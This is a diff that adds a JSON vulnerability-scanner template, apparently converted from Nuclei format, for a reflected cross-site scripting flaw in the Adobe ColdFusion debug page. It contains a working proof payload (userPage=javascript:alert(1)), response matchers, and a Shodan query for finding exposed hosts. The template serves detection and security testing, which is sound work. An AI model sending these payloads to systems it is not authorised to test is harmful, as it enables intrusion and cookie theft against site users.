@@ -1,0 +1,169 @@
+{
+  "id": "coldfusion-debug-xss",
+  "name": "Adobe ColdFusion - Cross-Site Scripting",
+  "author": "dhiyaneshDK",
+  "severity": "HIGH",
+  "description": "Adobe ColdFusion debug page contains a cross-site scripting vulnerability when the application is running on a remote host. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.",
+  "references": [
+    "https://github.com/jaeles-project/jaeles-signatures/blob/master/common/coldfusion-debug-xss.yaml"
+  ],
+  "tags": [
+    "adobe",
+    "coldfusion",
+    "xss"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "http.component:\"Adobe ColdFusion\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-79",
+  "cvssScore": "7.2",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/CFIDE/debug/cf_debugFr.cfm?userPage\u003djavascript:alert(1)",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "\"cf_main_cf\" src\u003d\"javascript:alert(1)\""
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "header",
+          "values": [
+            "text/html"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "coldfusion-debug-xss",
+    "info": {
+      "name": "Adobe ColdFusion - Cross-Site Scripting",
+      "author": "dhiyaneshDK",
+      "severity": "high",
+      "description": "Adobe ColdFusion debug page contains a cross-site scripting vulnerability when the application is running on a remote host. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.",
+      "reference": [
+        "https://github.com/jaeles-project/jaeles-signatures/blob/master/common/coldfusion-debug-xss.yaml"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
+        "cvss_score": "7.2",
+        "cwe_id": "CWE-79"
+      },
+      "metadata": {
+        "max_request": 2,
+        "shodan_query": "http.component:\"Adobe ColdFusion\""
+      },
+      "tags": "adobe,coldfusion,xss"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/CFIDE/debug/cf_debugFr.cfm?userPage\u003djavascript:alert(1)",
+          "{{BaseURL}}/cfusion/debug/cf_debugFr.cfm?userPage\u003djavascript:alert(1)"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "\"cf_main_cf\" src\u003d\"javascript:alert(1)\""
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "header",
+            "words": [
+              "text/html"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
